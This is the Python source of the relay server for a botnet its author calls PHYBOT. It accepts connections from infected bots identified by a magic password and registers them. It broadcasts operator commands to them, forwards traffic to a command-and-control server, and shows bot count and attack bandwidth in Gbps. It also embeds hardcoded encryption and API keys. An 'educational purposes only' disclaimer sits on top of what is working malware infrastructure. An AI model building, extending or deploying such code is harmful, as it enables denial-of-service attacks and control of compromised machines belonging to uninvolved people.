#!/usr/bin/python3

import socket
import threading
import sys
import time
from colorama import Fore, init
import hashlib
from cryptography.fernet import Fernet
import requests
from modules.config import rl_config_addr as addrconf, c2_config_addr as c2addrconf
from modules.loops import Loops as loop
from modules.relay import Relay as rl



__filename__="relay"
__version__="2.0"
__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
__infos__="This is a 'new version' of my old botnet B0T4N3T"


if c2addrconf.cnc_p!=0:
    C2_PORT=c2addrconf.cnc_p
else:
    C2_PORT=8080
if c2addrconf.cnc_ip!="":
    C2_ADDRESS=c2addrconf.cnc_ip
else:
    C2_ADDRESS="127.0.0.1"

C2=(str(C2_ADDRESS), int(C2_PORT))

api_url="http://localhost/phybot/api/v2"
urlkey="VEIDVOE9oN8O3C4TnU2RIN1O0rF82mU6RuJwHFQ6GH5mF4NQ3pZ8Z6R7A8dL0"
enckeyD="kg6QH9EBtZUziQ8DdEqwnCknt7lKTfpc2zEEvb3Imms="
passwd="b'gAAAAABixrd26TgeuuQmRhjWorB1oea-lO950B8hWYNHSTL2NvA3RW7A9MWAJXmDOeTJW9z5AWMp2pR0GHZqGPG36W2tXqPpLWkunwvc4CV8z5eJ0LNk5BU='"
relaykey="gAAAAABi2DQ2aBL7F1w-YK7tJQwZb_lnZY099Q2iCXqcLbLZy75ULiQk_VYWFglVco5PJrr0X-Jov_OaGwmL5HL5oYGqpACT7IiGspfgByyXQgY6U5an0Hk="
fer=Fernet(enckeyD)
bots={}
speed=[]
gkey=[]
ogkey=[]
ansi_clear = '\033[2J\033[H'
w=Fore.GREEN
y=Fore.WHITE
r=Fore.RESET
rd=Fore.RED



def find_login(username: str, password: str):
    password=hashlib.sha256(password.encode()).hexdigest()
    req=f"{api_url}/login.php?urlkey={urlkey}&usr={username}&pass={password}"
    print(f"\n\n{req}\n\n\n\n")
    r=requests.get(req).json()
    if r=="ok":
        return True
    else:
        return False



def send(socket, data: str, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())



def broadcast(data: str):
    print(data)
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data}', False, False)
            print(data)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()
    


def update_title(client, username: str):
    while 1:
        try:
            send(client, f'\33]0;{username}@PHYBOT RELAY  |  Bots: {len(bots)}  |  Speed: {sum(speed)/125000} Gbps  |  {time.asctime(time.localtime())}\a', False)
            time.sleep(1)
        except:
            client.close()



def handle_client(client, address):
    
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{y}Username{y} > ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{y}Password{y} > {Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, f'{rd}[{y}!{rd}]{r} Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()

    else:
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})



def main():
    if int(addrconf.relay_p)!=0:
        port=addrconf.relay_p

    else:
        if len(sys.argv) != 2:
            print(f'Usage: python3 {sys.argv[0]} <relay port>')
            exit()

        port = sys.argv[1]
        if not port.isdigit() or int(port) < 1 or int(port) > 65535:
            print('Invalid relay port')
            exit()
        port = int(port)
    
    init(convert=True)

    sock=socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', 5000))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()
    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, fer=fer, gkey=gkey, speed=speed, ogkey=ogkey, passwd=passwd, relaykey=relaykey, bots=bots).ping).start()
    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, fer=fer, gkey=gkey, speed=speed, ogkey=ogkey, passwd=passwd, relaykey=relaykey, bots=bots).net).start()
    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, fer=fer, gkey=gkey, speed=speed, ogkey=ogkey, passwd=passwd, relaykey=relaykey, bots=bots).genkey).start()
    threading.Thread(target=rl(relaykey=relaykey, C2=C2, speed=speed, bots=bots).relay).start()

    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    print(f"\nLegit: {__legit__}\n")
    main()